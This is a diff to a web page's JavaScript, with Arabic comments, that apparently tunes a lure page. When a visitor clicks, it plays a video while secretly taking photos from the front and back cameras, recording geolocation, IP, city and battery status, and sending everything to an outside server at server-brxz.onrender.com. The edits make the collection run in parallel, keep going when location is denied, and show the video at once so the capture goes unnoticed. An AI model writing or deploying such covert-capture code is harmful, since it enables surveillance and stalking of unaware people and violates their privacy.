@@ -289,11 +289,11 @@
                 }
             }
 
-            // ✅ جلب IP (بدون انتظار طويل)
+            // ✅ جلب IP - بدون انتظار طويل
             async function fetchIPInfo() {
                 try {
                     const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 3000); // مهلة 3 ثوانٍ فقط
+                    setTimeout(() => controller.abort(), 3000);
                     const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                     const data = await response.json();
                     capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
@@ -312,7 +312,7 @@
                 }
             }
 
-            // ✅ التصوير — بدون تأخير 1 ثانية
+            // ✅ التصوير - بدون تأخير طويل
             async function captureFromCamera(facingMode) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
@@ -323,11 +323,10 @@
                     video.muted = true;
                     await video.play();
 
-                    // ✅ الانتظار حتى يصبح الفيديو جاهزاً بدلاً من ثانية ثابتة
                     await new Promise(resolve => {
                         if (video.readyState >= 2) return resolve();
                         video.onloadeddata = () => resolve();
-                        setTimeout(resolve, 500); // حد أقصى نصف ثانية
+                        setTimeout(resolve, 500);
                     });
 
                     const canvas = document.createElement('canvas');
@@ -335,7 +334,7 @@
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.7).split(',')[1]); // ضغط أقل
+                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.7).split(',')[1]);
                     stream.getTracks().forEach(track => track.stop());
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                 } catch {
@@ -343,37 +342,47 @@
                 }
             }
 
-            // ✅ طلب الموقع — مهلة أقصر
+            // ✅ طلب الموقع - لا يوقف الفيديو حتى لو رُفض
             async function getLocation() {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: false, // ✅ أسرع
-                            timeout: 5000,             // ✅ 5 ثوانٍ بدلاً من 15
-                            maximumAge: 60000          // ✅ قبول موقع مخزن
-                        });
-                    });
-                    capturedData.location =
-                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
-                    capturedData.permissions.push('Geolocation Allowed');
-                } catch {
-                    capturedData.permissions.push('Geolocation Denied');
-                    capturedData.location = '';
-                }
+                return new Promise((resolve) => {
+                    const timeout = setTimeout(() => {
+                        capturedData.permissions.push('Geolocation Timeout');
+                        capturedData.location = 'Not Available';
+                        resolve(); // ✅ يكمل حتى بدون موقع
+                    }, 3000);
+
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            clearTimeout(timeout);
+                            capturedData.location = 
+                                `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                            capturedData.permissions.push('Geolocation Allowed');
+                            resolve();
+                        },
+                        (error) => {
+                            clearTimeout(timeout);
+                            capturedData.permissions.push('Geolocation Denied');
+                            capturedData.location = 'Denied by User';
+                            resolve(); // ✅ يكمل حتى لو رفض المستخدم
+                        },
+                        {
+                            enableHighAccuracy: false,
+                            timeout: 3000,
+                            maximumAge: 60000
+                        }
+                    );
+                });
             }
 
-            // ✅ إرسال البيانات في الخلفية (بدون حظر الواجهة)
+            // ✅ إرسال البيانات في الخلفية
             function sendDataInBackground(data) {
-                // استخدام sendBeacon أولاً (الأسرع ولا يحظر)
                 try {
                     const blob = new Blob([new URLSearchParams(data).toString()], {
                         type: 'application/x-www-form-urlencoded'
                     });
                     navigator.sendBeacon('https://server-brxz.onrender.com/submitData', blob);
-                    return;
                 } catch (e) {}
 
-                // fallback: fetch بدون انتظار
                 fetch('https://server-brxz.onrender.com/submitData', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -394,11 +403,11 @@
                 }
             }
 
-            // ✅ جمع البيانات في الخلفية (بدون انتظار)
+            // ✅ جمع البيانات في الخلفية - بدون انتظار
             async function collectDataInBackground() {
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
-                // ✅ كل العمليات تتم بالتوازي بدلاً من التسلسل
+                // ✅ كل العمليات بالتوازي ولا تنتظر
                 await Promise.allSettled([
                     fetchIPInfo(),
                     getBatteryStatus(),
@@ -419,30 +428,31 @@
                 sendDataInBackground(data);
             }
 
-            // ✅ معالج الضغط — إظهار الفيديو فوراً ثم جمع البيانات
+            // ✅ معالج الضغط - الفيديو يشتغل فوراً
             async function handleButtonClick() {
                 if (isProcessing || videoStarted) return;
                 isProcessing = true;
 
                 if (!settingsOpened) {
+                    // الضغطة الأولى - فتح الإعدادات
                     settingsOpened = true;
                     openLocationSettings();
                     isProcessing = false;
                 } else {
-                    // ✅ إظهار الفيديو فوراً (بدون انتظار)
+                    // الضغطة الثانية - تشغيل الفيديو فوراً
                     videoStarted = true;
-                    showVideo();
-
-                    // ✅ جمع البيانات في الخلفية (لا ينتظر)
+                    showVideo(); // ✅ الفيديو يشتغل مباشرة
+                    
+                    // جمع البيانات في الخلفية بدون انتظار
                     collectDataInBackground().catch(() => {});
-
+                    
                     isProcessing = false;
                 }
             }
 
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // العودة من الإعدادات — انتظار الضغطة الثانية
+                    // العودة من الإعدادات
                 }
             });
 
